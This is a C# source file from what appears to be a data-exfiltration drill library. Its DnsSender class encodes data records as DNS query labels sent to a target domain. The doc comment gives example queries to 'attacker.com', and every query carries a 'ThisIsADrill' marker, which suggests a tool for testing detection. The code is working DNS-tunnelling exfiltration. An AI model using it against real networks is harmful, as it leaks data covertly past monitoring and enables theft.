using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using LibExfil.Structures;
using System.Net.Http;
using System.Net.Sockets;
using System.Web;
using LibExfil.DataSenders;
using LibExfil.Toolbox.DNS;
using System.IO;
using System.Net;
using System.Windows.Forms.VisualStyles;


namespace LibExfil.DataSenders
{
    class DnsSender : IBaseSenderInterface
    {
        int RecordsSent = 0;
        readonly string host_suffix;
        readonly DNSUtils DnsUtils;
        readonly Options ops;
        const string SAFETY_WORD = "THIS.IS.A.DRILL.";

        /// <summary>
        /// Used to send data over dns.
        /// Specify a dns server ip if you wish to spend to a specific dns server.
        /// domain name is the label that will be affixed to the end of the quer
        /// </summary>
        /// <param name="target_domain">the domain name label to affix to the dns queries</param>
        public DnsSender(string target_domain, Options opts = Options.NONE)
        {
            DnsUtils = new DNSUtils();
            this.host_suffix = target_domain;
            /*initialize members using spaghetti code, chef boy ardee style*/
           
            ops = opts;
        }

        /// <summary>
        ///this will perform a sequence of DNS querys, which are roughly equivalent to doing the following:
        ///
        ///  GetHostEntry("ThisIsADrill.ThisIsADrill.ThisIsADrill.attacker.com")
        ///  GetHostEntry("[val1].[key1].[rec1].attacker.com")
        ///  GetHostEntry("[val2].[key2].[rec2].attacker.com")
        ///  GetHostEntry("[val3].[key3].[rec3].attacker.com")
        ///  GetHostEntry("[val-n].[key-n].[rec-n].attacker.com")
        ///  GetHostEntry("ThisIsADrill.ThisIsADrill.ThisIsADrill.attacker.com")
        ///
        ///  where 'n' is the number of key value pairs in a record.
        ///  It will repeat this pattern for every piece of exfiltrated data.
        ///  --
        ///  for eaxmple: 
        ///      a DataRecordCollection object with a Shape of 100,5 (that means 100 records, and schema lenght of 5)
        ///      will make a total of 100x5+2=502 dns queryies to the target.
        ///  
        ///  So. in general, it will send a total number of DNS requests equal to:
        ///     records.Shape.Rows x records.Shape.Columns + 2
        /// 
        /// 
        ///  It will not wait nor care about the response.
        /// </summary>
        /// <param name="records">the DataRecordCollection object to exfiltrate</param>
        /// <param name="target_domain">DNS domain to target.  If default, the query will be sent to 'localhost.local'</param>
        /// /// <param name="base64encode">base 64 encode the values.  default is false</param>
        public int Send(DataRecordCollection data, string custom_name_resolver) 
        {
            IPAddress t;
            
            custom_name_resolver = (!IPAddress.TryParse(custom_name_resolver, out t))   //check if we have been supplied an ip.  if so, continue, if not then translate the host name to an ip
                ? DnsUtils.GetIPFromName(custom_name_resolver) 
                : custom_name_resolver;   

            int items_sent = 0;
            bool async_mode = ((ops & Options.ASYNCHRONOUS_MODE) != 0);
            string query;

            string[] keys = data.GetSchema();
            foreach (object o in data.GetRecords()) //iterate through each record in the records list
            {
                if (o == null)
                    continue;
                DataRecord dr = (DataRecord)o;
                string[] vals = dr.Data;
                query = "ThisIsADrill.ThisIsADrill.ThisIsADrill." + host_suffix;
                DnsUtils.SendDnsQuery(query, custom_name_resolver, async_mode);
                items_sent++;
                for (int i = 0; i < keys.Length; i++)
                {
                    String key = keys[i];
                    String val = vals[i];
                    String recNumber = "rec" + RecordsSent.ToString();
                    String[] labels = new String[] { val, key, recNumber, SAFETY_WORD+host_suffix };
                    labels = DnsUtils.MakeLabelsDNSCompliant(labels);
                    query = String.Join(".", labels.ToList());
                    DnsUtils.SendDnsQuery(query, custom_name_resolver, async_mode);
                    items_sent++;
                }
                DnsUtils.SendDnsQuery("ThisIsADrill.ThisIsADrill.ThisIsADrill" + host_suffix, custom_name_resolver, async_mode);
                items_sent++;
            }
            return items_sent;
        }




    }


}
